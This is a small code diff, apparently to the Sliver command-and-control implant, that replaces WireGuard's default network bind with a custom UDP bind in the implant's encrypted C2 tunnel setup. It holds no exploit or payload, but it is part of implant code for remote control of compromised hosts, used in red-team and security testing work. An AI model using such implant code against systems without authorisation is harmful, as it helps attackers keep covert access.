@@ -48,7 +48,6 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/netstack"
 	"golang.org/x/crypto/blake2b"
-	"golang.zx2c4.com/wireguard/conn"
 	"golang.zx2c4.com/wireguard/device"
 	"golang.zx2c4.com/wireguard/tun"
 	"google.golang.org/protobuf/proto"
@@ -375,7 +374,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	wgLogLevel = device.LogLevelVerbose
 	// {{end}}
 
-	dev := device.NewDevice(tun, conn.NewDefaultBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
+	dev := device.NewDevice(tun, newWGUDPBind(), device.NewLogger(wgLogLevel, "[c2/wg] "))
 	wgConf := bytes.NewBuffer(nil)
 	fmt.Fprintf(wgConf, "private_key=%s\n", implantPrivKey)
 	fmt.Fprintf(wgConf, "public_key=%s\n", serverPubKey)
